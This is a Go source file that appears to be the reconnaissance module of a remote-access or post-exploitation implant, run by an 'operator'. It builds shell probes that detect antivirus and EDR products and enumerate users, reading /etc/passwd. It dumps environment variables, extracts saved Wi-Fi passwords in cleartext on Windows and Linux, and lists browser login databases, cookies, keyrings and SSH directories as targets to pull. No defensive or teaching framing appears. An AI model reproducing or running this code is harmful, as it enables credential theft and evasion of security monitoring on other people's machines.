package main

import (
	"fmt"
	"os"
	"runtime"
	"sort"
	"strings"
)

// Host intelligence that needs more than one command or a path probe. Every
// step is best effort: a missing tool yields whatever the host does have, and
// the operator sees the raw output instead of a silent failure.

func recon(sub string) Result {
	switch strings.ToLower(strings.TrimSpace(sub)) {
	case "av":
		return firstOK(avProbes())
	case "users":
		return firstOK(userProbes())
	case "arp":
		return firstOK(arpProbes())
	case "route":
		return firstOK(routeProbes())
	case "env":
		return envDump()
	case "wifi":
		return firstOK(wifiProbes())
	case "browsers":
		return browserProbe()
	case "software":
		return firstOK(softwareProbes())
	case "boot":
		return firstOK(bootProbes())
	default:
		return Result{OK: false, Err: "sub must be av|users|arp|route|env|wifi|browsers|software|boot"}
	}
}

// firstOK runs probes in order and returns the first one that produced output.
func firstOK(probes []string) Result {
	var last Result
	for _, p := range probes {
		if strings.TrimSpace(p) == "" {
			continue
		}
		r := runShell(p)
		if r.OK && strings.TrimSpace(r.Out) != "" {
			return r
		}
		last = r
	}
	if last.Err != "" || last.Out != "" {
		return last
	}
	return Result{OK: false, Err: "no probe produced output"}
}

func avProbes() []string {
	if runtime.GOOS == "windows" {
		return []string{
			`powershell -NoProfile -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName,productState,pathToSignedProductExe | Format-List"`,
			`wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState,pathToSignedProductExe`,
			`powershell -NoProfile -Command "Get-Service | Where-Object {$_.DisplayName -match 'Defender|CrowdStrike|Sentinel|Carbon|Sophos|McAfee|Symantec|ESET|Kaspersky|Trellix|Cylance|Elastic|Wazuh|osquery'} | Format-Table -AutoSize"`,
			`tasklist /svc`,
		}
	}
	return []string{
		`ps aux 2>/dev/null | grep -Ei 'clam|falcon|sentinel|carbon|crowdstrike|osquery|wazuh|sophos|mdatp|tanium|nessus|qualys' | grep -v grep`,
		`systemctl list-units --type=service --state=running 2>/dev/null | grep -Ei 'clam|falcon|sentinel|carbon|crowdstrike|osquery|wazuh|sophos|mdatp|auditd'`,
		`ls /etc/cron.d /etc/cron.daily 2>/dev/null`,
	}
}

func userProbes() []string {
	if runtime.GOOS == "windows" {
		return []string{`net user`, `query user 2>nul || quser 2>nul`,
			`powershell -NoProfile -Command "Get-LocalGroupMember -Group Administrators | Format-Table -AutoSize"`}
	}
	return []string{`who; echo ---; last -n 12 2>/dev/null`,
		`cat /etc/passwd`, `awk -F: '$3>=1000{print $1,$3,$7}' /etc/passwd 2>/dev/null`}
}

func arpProbes() []string {
	if runtime.GOOS == "windows" {
		return []string{`arp -a`}
	}
	return []string{`ip neigh 2>/dev/null || arp -an 2>/dev/null`}
}

func routeProbes() []string {
	if runtime.GOOS == "windows" {
		return []string{`route print -4`}
	}
	return []string{`ip route 2>/dev/null || route -n 2>/dev/null`}
}

func envDump() Result {
	env := os.Environ()
	sort.Strings(env)
	return Result{OK: true, Out: strings.Join(env, "\n")}
}

func wifiProbes() []string {
	if runtime.GOOS == "windows" {
		return []string{
			`powershell -NoProfile -Command "$p=(netsh wlan show profiles) -match 'All User Profile' -replace '.*:\s*',''; foreach($n in $p){ netsh wlan show profile name=\"$n\" key=clear | Select-String 'SSID name|Key Content|Authentication' }"`,
			`netsh wlan show profiles`,
			`netsh wlan show interfaces`,
		}
	}
	return []string{
		`for c in $(nmcli -t -f NAME,TYPE connection show 2>/dev/null | awk -F: '$2=="802-11-wireless"{print $1}'); do echo "== $c"; nmcli -s -g 802-11-wireless-security.psk connection show "$c" 2>/dev/null; done`,
		`nmcli -t -f NAME,TYPE connection show 2>/dev/null`,
		`cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -Ei 'ssid|psk'`,
	}
}

// browserProbe lists credential stores so the operator knows what is worth
// pulling with the file browser.
func browserProbe() Result {
	home, _ := os.UserHomeDir()
	var roots []string
	if runtime.GOOS == "windows" {
		la, ra := os.Getenv("LOCALAPPDATA"), os.Getenv("APPDATA")
		roots = []string{
			la + `\Google\Chrome\User Data\Default\Login Data`,
			la + `\Google\Chrome\User Data\Default\Cookies`,
			la + `\Microsoft\Edge\User Data\Default\Login Data`,
			ra + `\Mozilla\Firefox\Profiles`,
			la + `\BraveSoftware\Brave-Browser\User Data\Default\Login Data`,
		}
	} else if runtime.GOOS == "darwin" {
		roots = []string{
			home + "/Library/Application Support/Google/Chrome/Default/Login Data",
			home + "/Library/Application Support/Firefox/Profiles",
			home + "/Library/Cookies/Cookies.binarycookies",
			home + "/.ssh",
		}
	} else {
		roots = []string{
			home + "/.config/google-chrome/Default/Login Data",
			home + "/.mozilla/firefox",
			home + "/.config/chromium/Default/Login Data",
			home + "/.local/share/keyrings",
			home + "/.ssh",
		}
	}
	var b strings.Builder
	b.WriteString("credential stores present on this host:\n")
	for _, p := range roots {
		if info, err := os.Stat(p); err == nil {
			kind := "file"
			if info.IsDir() {
				kind = "dir"
			}
			fmt.Fprintf(&b, "  [%s %dB] %s\n", kind, info.Size(), p)
		}
	}
	return Result{OK: true, Out: b.String()}
}

func softwareProbes() []string {
	if runtime.GOOS == "windows" {
		return []string{
			`powershell -NoProfile -Command "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object DisplayName | Select-Object -ExpandProperty DisplayName | Sort-Object"`,
			`reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s /v DisplayName`,
		}
	}
	if runtime.GOOS == "darwin" {
		return []string{`ls /Applications 2>/dev/null`}
	}
	return []string{`dpkg -l 2>/dev/null | awk '{print $2,$3}' | head -400`,
		`rpm -qa 2>/dev/null | head -400`, `ls /usr/bin | head -400`}
}

func bootProbes() []string {
	if runtime.GOOS == "windows" {
		return []string{`powershell -NoProfile -Command "(Get-CimInstance Win32_OperatingSystem).LastBootUpTime; (Get-CimInstance Win32_ComputerSystem) | Select-Object Manufacturer,Model,TotalPhysicalMemory | Format-List"`}
	}
	return []string{`uptime; echo ---; grep -m1 'model name' /proc/cpuinfo 2>/dev/null`,
		`uname -a; uptime`}
}
